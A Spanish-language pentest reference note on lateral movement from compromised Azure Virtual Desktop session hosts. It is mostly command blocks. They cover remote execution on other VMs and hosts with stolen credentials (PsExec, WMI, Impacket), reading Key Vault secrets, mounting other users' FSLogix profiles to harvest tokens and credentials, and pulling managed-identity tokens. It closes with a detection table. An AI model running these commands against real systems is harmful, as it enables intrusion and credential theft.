---
tags: [cloud, azure, avd, lateral-movement, pivoting, imds]
status: wip
---

# AVD — Lateral Movement

> Pivoting desde session hosts AVD hacia la red interna, otros recursos Azure y Microsoft 365.

---

## Contexto

Los session hosts están en una Azure VNET y típicamente tienen:
- Conectividad a AD DS (on-prem o Azure AD DS) para autenticación
- Acceso a Azure Storage (FSLogix profiles, file shares)
- Acceso al IMDS (169.254.169.254)
- Posible conectividad a red corporativa vía VPN/ExpressRoute/peering

---

## Pivoting vía Managed Identity

```bash
# Si el session host tiene Managed Identity → ya cubierto en Session Host Attacks
# Con el token, enumerar qué puede hacer la MI

# Listar recursos accesibles
az resource list --output table

# Listar role assignments
az role assignment list --all --output table

# Si tiene Contributor sobre RG:
# → Ejecutar comandos en otras VMs
az vm run-command invoke \
  --resource-group <RG> \
  --name <OTHER_VM> \
  --command-id RunPowerShellScript \
  --scripts "whoami; ipconfig"

# Si tiene acceso a Key Vault:
az keyvault secret list --vault-name <VAULT> --output table
az keyvault secret show --vault-name <VAULT> --name <SECRET>
```

---

## Pivoting a otros Session Hosts

```powershell
# En multi-session pools, los usuarios se balancean entre hosts
# Desde un host comprometido → acceder a otros hosts del pool

# Con credenciales/hash obtenidos de LSASS
# PSExec
psexec.exe \\<OTHER_HOST> -u DOMAIN\admin -p password cmd.exe

# WMI
wmic /node:<OTHER_HOST> process call create "cmd.exe /c whoami > C:\temp\out.txt"

# WinRM (si 5985/5986 abierto entre hosts)
Enter-PSSession -ComputerName <OTHER_HOST> -Credential $cred

# Impacket (desde Linux)
impacket-psexec domain/user:password@<OTHER_HOST>
impacket-wmiexec domain/user:password@<OTHER_HOST>
impacket-smbexec domain/user:password@<OTHER_HOST>
```

---

## Pivoting a Azure Storage (FSLogix)

```powershell
# Los perfiles FSLogix se almacenan en Azure Files
# Ruta típica: \\storageaccount.file.core.windows.net\profiles\

# Desde el session host ya autenticado:
dir \\storageaccount.file.core.windows.net\profiles\

# Cada perfil es un VHD/VHDX:
# SID_username\Profile_username.vhdx

# Montar un perfil de otro usuario (requiere permisos en el share)
# En Windows:
Mount-DiskImage -ImagePath "\\storageaccount.file.core.windows.net\profiles\S-1-5-..._jdoe\Profile_jdoe.vhdx"

# Dentro del VHD:
# - AppData → tokens, cookies, credenciales guardadas
# - Documents → datos del usuario
# - .ssh / .aws / .azure → credenciales cloud
```

```bash
# Si se obtiene la storage account key:
az storage account keys list --account-name <STORAGE> --resource-group <RG>

# Descargar perfiles directamente
az storage file download-batch \
  --destination ./profiles \
  --source profiles \
  --account-name <STORAGE> \
  --account-key <KEY>
```

---

## Pivoting a red corporativa

```bash
# Si la VNET del host pool tiene peering con VNETs on-prem:
# El session host puede alcanzar la red interna

# Descubrir rutas y conectividad
route print
ipconfig /all
# → Buscar subnets, DNS servers, default gateway

# Escaneo de red (si se puede ejecutar herramientas)
# Portar nmap o usar PowerShell
1..254 | ForEach-Object { Test-NetConnection -ComputerName "10.0.1.$_" -Port 445 -WarningAction SilentlyContinue | Where-Object TcpTestSucceeded }

# Si hay DNS interno → enumerar registros
nslookup -type=any _ldap._tcp.dc._msdcs.domain.local
nslookup -type=srv _kerberos._tcp.domain.local
```

---

## Pivoting a Microsoft Graph / M365

```powershell
# Con tokens de usuario o PRT → acceder a Graph API

# GraphRunner — enumeración post-auth
Import-Module .\GraphRunner.ps1
Invoke-GraphRunner

# Operaciones interesantes:
# - Leer emails (Mail.Read)
# - Acceder a SharePoint/OneDrive
# - Enumerar usuarios, grupos, roles
# - Buscar en Teams

# Con az cli
az ad user list --output table
az ad group list --output table
az ad app list --output table
```

---

## Pivoting vía Azure Arc (si habilitado)

```powershell
# Si el session host está registrado en Azure Arc:
# El agente Arc tiene un Managed Identity propio

# El token se obtiene igual vía IMDS pero en un endpoint diferente
# Verificar
Get-Service -Name himds  # Hybrid Instance Metadata Service

# Si está presente → endpoint en localhost:40342
$token = Invoke-RestMethod -Uri "http://localhost:40342/metadata/identity/oauth2/token?api-version=2020-06-01&resource=https://management.azure.com/" -Headers @{Metadata="true"}
```

---

## Abuso de Azure Automation / RunBooks

```powershell
# Si hay Azure Automation Accounts con Runbooks que el session host puede triggear

# Listar automation accounts
az automation account list --resource-group <RG> --output table

# Listar runbooks
az automation runbook list \
  --automation-account-name <ACCOUNT> \
  --resource-group <RG> --output table

# Si hay Run As Account → certificado para autenticación
# Si hay Managed Identity → pivotar a otros recursos
# Ejecutar runbook existente o crear uno nuevo (si se tiene permiso)
az automation runbook start \
  --automation-account-name <ACCOUNT> \
  --resource-group <RG> \
  --name <RUNBOOK>
```

---

## OPSEC / Detección

| Acción | Log/Alerta |
|--------|------------|
| VM Run Command | Azure Activity Log — `RunCommand` operation |
| SMB lateral movement | Windows Security Event 4624 tipo 3 + Event 5140 (share access) |
| WinRM | Windows Event 91 (WSMan) + PowerShell remoting logs |
| Storage account key usage | Azure Storage Analytics Logs |
| Graph API enumeration | Entra ID Sign-in Logs (delegated permissions) |

---

## Ver también

- [[09-cloud/azure/azure-virtual-desktop|Azure Virtual Desktop]]
- [[09-cloud/azure/avd---session-host-attacks|AVD - Session Host Attacks]]
- [[09-cloud/azure/avd---persistencia|AVD - Persistencia]]

---

## Referencias

- [GraphRunner — dafthack](https://github.com/dafthack/GraphRunner)
- [Azure Attack Paths — Andy Robbins (SpecterOps)](https://posts.specterops.io/)
- [Managed Identity Abuse — NetSPI](https://www.netspi.com/blog/technical/cloud-penetration-testing/)
- [FSLogix Security — Microsoft](https://learn.microsoft.com/en-us/fslogix/overview-prerequisites)
